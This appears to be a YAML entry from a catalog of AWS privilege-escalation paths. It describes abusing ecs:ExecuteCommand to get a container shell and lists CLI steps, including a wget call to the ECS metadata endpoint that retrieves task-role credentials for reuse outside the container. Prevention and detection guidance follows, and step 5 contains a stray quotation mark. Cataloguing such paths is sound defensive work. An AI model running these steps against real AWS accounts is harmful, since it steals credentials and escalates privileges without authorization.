id: ecs-006
name: ecs:ExecuteCommand
category: existing-passrole
services:
  - ecs

permissions:
  required:
    - permission: ecs:ExecuteCommand
      resourceConstraints: Must have permission on ECS tasks in clusters with ECS Exec enabled
  additional:
    - permission: ecs:ListClusters
      resourceConstraints: Helpful for discovering ECS clusters in the account
    - permission: ecs:ListTasks
      resourceConstraints: Helpful for discovering task ARNs in the target cluster
    - permission: ecs:DescribeTasks
      resourceConstraints: Useful for viewing task details including container names and task role
    - permission: ecs:DescribeTaskDefinition
      resourceConstraints: Useful for viewing the task definition to discover the task role ARN

description: A principal with `ecs:ExecuteCommand` can establish an interactive shell session in a running ECS container, but only if ECS Exec has been explicitly enabled on the service (it is disabled by default). If the task has a privileged IAM role attached, the attacker can retrieve the role's temporary credentials from the container metadata service at `169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` and use them to perform actions as that role.

prerequisites:
  admin:
    - An ECS service must have ECS Exec explicitly enabled (`enable_execute_command = true`) - this is disabled by default and does not work on default ECS services
    - The service must have at least one running task
    - The task must have a task role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - The ECS Exec agent (SSM agent) must be running and healthy in the container
    - The attacker must have the AWS Systems Manager Session Manager plugin installed locally
    - Network connectivity must allow SSM session establishment (task needs outbound internet or VPC endpoints)
  lateral:
    - An ECS service must have ECS Exec explicitly enabled (`enable_execute_command = true`) - this is disabled by default and does not work on default ECS services
    - The service must have at least one running task
    - The task must have a task role with some elevated permissions
    - The ECS Exec agent (SSM agent) must be running and healthy in the container
    - The attacker must have the AWS Systems Manager Session Manager plugin installed locally
    - Network connectivity must allow SSM session establishment (task needs outbound internet or VPC endpoints)

exploitationSteps:
  awscli:
    - step: 1
      command: aws ecs list-clusters
      description: Discover ECS clusters in the account
    - step: 2
      command: aws ecs list-tasks --cluster CLUSTER_NAME
      description: List running tasks in the target cluster
    - step: 3
      command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
      description: Get task details to find container names and verify ECS Exec is enabled
    - step: 4
      command: |
        aws ecs execute-command \
          --cluster CLUSTER_NAME \
          --task TASK_ARN \
          --container CONTAINER_NAME \
          --interactive \
          --command "/bin/sh"
      description: Establish an interactive shell session in the running container using ECS Exec
    - step: 5
      command: wget -qO- http://169.254.170.2\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
      description: Inside the container, retrieve the task role credentials from the ECS metadata service
    - step: 6
      command: |
        export AWS_ACCESS_KEY_ID="<AccessKeyId>"
        export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
        export AWS_SESSION_TOKEN="<Token>"
        aws sts get-caller-identity
      description: Use the retrieved credentials outside the container to operate as the task role

recommendation: |
  This privilege escalation path exploits `ecs:ExecuteCommand` access to tasks running with privileged roles. Unlike PassRole-based attacks, the role has already been attached to the running task - the attacker simply needs shell access to retrieve its credentials.

  **Prevention:**

  - **Disable ECS Exec on production tasks** - Only enable ECS Exec when actively debugging, and disable immediately after. Use separate clusters for debugging and production workloads.
  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege for all task roles.
  - **Restrict `ecs:ExecuteCommand` permission** - Use IAM conditions to limit which clusters, services, or tasks can be accessed:

  ```json
  {
    "Effect": "Allow",
    "Action": "ecs:ExecuteCommand",
    "Resource": "arn:aws:ecs:*:ACCOUNT_ID:task/specific-cluster/*",
    "Condition": {
      "StringEquals": {
        "aws:ResourceTag/AllowExec": "true"
      }
    }
  }
  ```

  - **Use resource tags** - Tag tasks that should allow ECS Exec and enforce tag-based conditions in IAM policies
  - **Enable CloudWatch logging for ECS Exec** - Configure logging to capture all commands executed within containers

  **Detection:**

  - Monitor CloudTrail for `ecs:ExecuteCommand` API calls, especially targeting tasks with privileged roles
  - Alert on ECS Exec sessions from unexpected principals or at unusual times
  - Correlate ECS Exec sessions with subsequent API calls using task role credentials
  - Monitor container logs for metadata service access patterns

limitations: |
  This path provides administrative access only if the task role has administrative permissions. The level of access gained depends entirely on what permissions are attached to the running task's role. Even limited access through a task role may enable further privilege escalation or data access.

discoveryAttribution:
